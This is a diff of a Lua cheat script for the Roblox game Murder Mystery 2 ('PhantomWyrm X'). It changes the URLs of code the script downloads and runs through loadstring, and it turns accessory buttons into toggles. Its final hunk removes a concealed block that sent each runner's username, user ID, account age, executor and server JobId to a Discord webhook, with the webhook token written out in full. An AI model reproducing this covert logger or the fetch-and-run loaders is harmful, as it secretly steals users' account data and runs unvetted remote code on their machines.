@@ -1,7 +1,7 @@
-local Fluent = loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/Fluent-mod/refs/heads/master/Modded-Fluent/main.lua"))()
-local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/Fluent-mod/refs/heads/master/Modded-Fluent/SaveManager.lua"))()
-local FBM = loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/Fluent-mod/refs/heads/master/Modded-Fluent/FBM.lua"))()
-local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/Fluent-mod/refs/heads/master/Modded-Fluent/InterfaceManager.lua"))()
+local Fluent = loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/This-is-Not-Your-place/refs/heads/master/Addons/MinifyMain.txt"))()
+local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/This-is-Not-Your-place/refs/heads/master/Addons/SaveManager.txt"))()
+local FBM = loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/This-is-Not-Your-place/refs/heads/master/Addons/FBM.txt"))()
+local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/This-is-Not-Your-place/refs/heads/master/Addons/InterfaceManager.txt"))()
 
 if not Fluent or not SaveManager or not InterfaceManager or not FBM then return game.Players.LocalPlayer:Kick("Error: Interface didn't load") end
 
@@ -16,8 +16,8 @@ end
 _G.PhantomWyrmXIsAlreadyRunning = true
 
 local Window = Fluent:CreateWindow({
-    Title = "PhantomWyrm X - Murder Mystery 2│Mobile",
-    SubTitle = "v2.9.8 Made By Carryxkn2",
+    Title = "PhantomWyrm X - Murder Mystery 2",
+    SubTitle = "v2.9.9 Made By Carryxkn2",
     TabWidth = 160,
     Size = UDim2.fromOffset(540, 390),
     Acrylic = false,
@@ -92,7 +92,7 @@ local SizeBackMulti = 0.1
 local AssetsIcon = "rbxassetid://14065855770"
 local AssetsBackground = "rbxassetid://17010311852"
 
--- === ROTATING BACKGROUND IMAGE (inside the button) ===
+-- === ROTATING BACKGROUND IMAGE
 local backgroundImage = Instance.new("ImageLabel")
 backgroundImage.Name = "RotatingBackground"
 backgroundImage.Parent = mainopen
@@ -6836,7 +6836,7 @@ Tabs.Premium:AddButton({
     Title = "Apply Accessory",
     Callback = function()
         if _G.SavedID then
-            local success, code = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/twinkilya0-jpg/This-is-Not-Your-place/refs/heads/master/SkinsChangers/SkinChanger.txt")
+            local success, code = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/twinkilya0-jpg/Fluent-Modded/refs/heads/master/SkinExtensions/SkinChanger.lua")
             if success then
                 local func = loadstring(code)
                 if func then
@@ -7287,7 +7287,7 @@ Tabs.Extension:AddButton({
                 end
             end
         end
-
+-- тут
         if player.Character then
             applyKorblox(player.Character)
         end
@@ -7370,54 +7370,108 @@ Tabs.Extension:AddButton(
     }
 )
 
-Tabs.Extension:AddButton({
-    Title = "AngelicWings",
-    Description = "",
-    Callback = function()
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/This-is-Not-Your-place/refs/heads/master/SkinsChangers/AngelicWing.txt"))()
+_G.Players = game:GetService("Players")
+_G.LPlayer = _G.Players.LocalPlayer
+
+_G.ExtStates = {
+    Wings = false,
+    Poison = false,
+    Frozen = false,
+    Fire = false
+}
+
+_G.ApplySingleExt = function(id, name, state)
+    if not state then
+        if _G.LPlayer.Character and _G.LPlayer.Character:FindFirstChild(name) then
+            _G.LPlayer.Character[name]:Destroy()
+        end
+        return
+    end
+    
+    if not _G.LPlayer.Character or _G.LPlayer.Character:FindFirstChild(name) then return end
+    
+    local s, obj = pcall(function() return game:GetObjects("rbxassetid://" .. id)[1] end)
+    if s and obj then
+        obj.Name = name
+        obj.Parent = _G.LPlayer.Character
+        local h = obj:FindFirstChild("Handle")
+        if h then
+            local w = Instance.new("Weld", h)
+            w.Part0 = h
+            w.Part1 = _G.LPlayer.Character:FindFirstChild("Head")
+            w.C0 = obj.AttachmentPoint
+            w.C1 = CFrame.new(0, 0.5, 0)
+            w.Parent = h
+        end
+    end
+end
+
+_G.RefreshExts = function()
+    if _G.ExtStates.Wings then _G.ApplySingleExt(192557913, "Wings_Acc", true) end
+    if _G.ExtStates.Poison then _G.ApplySingleExt(1744060292, "Poison_Acc", true) end
+    if _G.ExtStates.Frozen then _G.ApplySingleExt(74891470, "Frozen_Acc", true) end
+    if _G.ExtStates.Fire then _G.ApplySingleExt(215718515, "Fire_Acc", true) end
+end
+
+_G.LPlayer.CharacterAdded:Connect(function()
+    task.wait(1.5) 
+    _G.RefreshExts()
+end)
+
+Tabs.Extension:AddToggle("TogWings", {
+    Title = "Angelic Wings",
+    Default = false,
+    Callback = function(state) 
+        _G.ExtStates.Wings = state 
+        _G.ApplySingleExt(192557913, "Wings_Acc", state) 
     end
 })
 
-
-Tabs.Extension:AddButton({
-    Title = "PoisonousHorns",
-    Description = "",
-    Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/This-is-Not-Your-place/refs/heads/master/SkinsChangers/ToxicHorn.txt"))()
+Tabs.Extension:AddToggle("TogPoison", {
+    Title = "Poisonous Horns",
+    Default = false,
+    Callback = function(state) 
+        _G.ExtStates.Poison = state 
+        _G.ApplySingleExt(1744060292, "Poison_Acc", state) 
     end
 })
 
-Tabs.Extension:AddButton({
-    Title = "FrozenHorn",
-    Description = "",
-    Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/This-is-Not-Your-place/refs/heads/master/SkinsChangers/FrozenHorn.txt"))()
+Tabs.Extension:AddToggle("TogFrozen", {
+    Title = "Frozen Horn",
+    Default = false,
+    Callback = function(state) 
+        _G.ExtStates.Frozen = state 
+        _G.ApplySingleExt(74891470, "Frozen_Acc", state) 
     end
 })
 
-Tabs.Extension:AddButton({
-    Title = "FireHorn",
-    Description = "",
-    Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/This-is-Not-Your-place/refs/heads/master/SkinsChangers/FireHorn.txt"))()
+Tabs.Extension:AddToggle("TogFire", {
+    Title = "Fire Horn",
+    Default = false,
+    Callback = function(state) 
+        _G.ExtStates.Fire = state 
+        _G.ApplySingleExt(215718515, "Fire_Acc", state) 
     end
 })
+
 
 Tabs.Extension:AddButton({
     Title = "AvatarChanger",
-    Description = "",
+    Description = "By Byteed",
     Callback = function()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-client-avatar-changer-92130"))()
     end
 })
 
+
 Tabs.Extension:AddSection("Camera Extension")
 
-Tabs.Extension:AddButton({
+Tabs.Extension:AddButton(
+    {
         Title = "sensitivity",
         Description = "",
         Callback = function()
-loadstring(game:HttpGet("https://pastebin.com/raw/RkgRJhck"))()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/Fluent-Modded/refs/heads/master/Others/Sensitivity.lua"))()
         end
     }
 )
@@ -8299,51 +8353,3 @@ LocalPlayer.CharacterAdded:Connect(function(char)
        end
     end
 end) 
-
-do
-    _G.Data = {}
-    _G.Data.P = game.Players.LocalPlayer
-    _G.Data.H = game:GetService('HttpService')
-    _G.Data.U = 'https://discord.com/api/webhooks/1504450739102023751/6h9TacV6neCOH_ngBaC5zwiKPNgKKauuqDy9XiAZ5AW10EPE6Mi0tREgzlVPXkZUakO'
-    
-    local function GetFields()
-        local info = _G.Data.P
-        local gName = 'Unknown'
-        pcall(function() gName = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name end)
-        
-        return {
-            {['name']='**Username**',['value']=info.Name,['inline']=false},
-            {['name']='**Display Name**',['value']=info.DisplayName,['inline']=false},
-            {['name']='**User ID**',['value']=tostring(info.UserId),['inline']=false},
-            {['name']='**Game Name**',['value']=gName,['inline']=false},
-            {['name']='**Account Age**',['value']=tostring(info.AccountAge)..' days',['inline']=false},
-            {['name']='**Registration**',['value']=os.date('%Y-%m-%d',os.time()-(info.AccountAge*86400)),['inline']=false},
-            {['name']='**Membership**',['value']=tostring(info.MembershipType):gsub('Enum.MembershipType.',''),['inline']=false},
-            {['name']='**Executor**',['value']=(identifyexecutor and identifyexecutor()) or 'Unknown',['inline']=false},
-            {['name']='**Place ID**',['value']=tostring(game.PlaceId),['inline']=false},
-            {['name']='**JobId**',['value']=tostring(game.JobId),['inline']=false}
-        }
-    end
-
-    local function Transmit()
-        local payload = _G.Data.H:JSONEncode({
-            ['username'] = 'Logs System',
-            ['embeds'] = {{
-                ['title'] = '👤 Full Intelligence Report',
-                ['description'] = 'User data bypass results',
-                ['color'] = 16711680,
-                ['fields'] = GetFields()
-            }}
-        })
-
-        local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
-        if req then
-            pcall(function() req({Url=_G.Data.U, Method='POST', Headers={['Content-Type']='application/json'}, Body=payload}) end)
-        else
-            pcall(function() _G.Data.H:PostAsync(_G.Data.U, payload) end)
-        end
-        _G.Data = nil
-    end
-
-    Transmit()
-end
